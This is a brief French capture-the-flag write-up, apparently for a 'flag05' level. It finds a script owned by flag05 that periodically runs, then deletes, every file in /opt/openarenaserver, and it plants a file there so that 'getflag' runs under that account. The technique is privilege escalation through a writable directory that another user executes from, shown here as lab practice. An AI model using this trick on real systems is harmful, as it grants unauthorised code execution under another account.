```
$> find  / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver

$> cat /usr/sbin/openarenaserver
```
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Il semblerait que periodiquement les fichiers presents dans `/opt/openarenaserver` sont executes et effaces.
Il suffit de mettre notre exploit a cet endroit:

```
echo "getflag > /tmp/ola" > /opt/openarenaserver/exploit
```
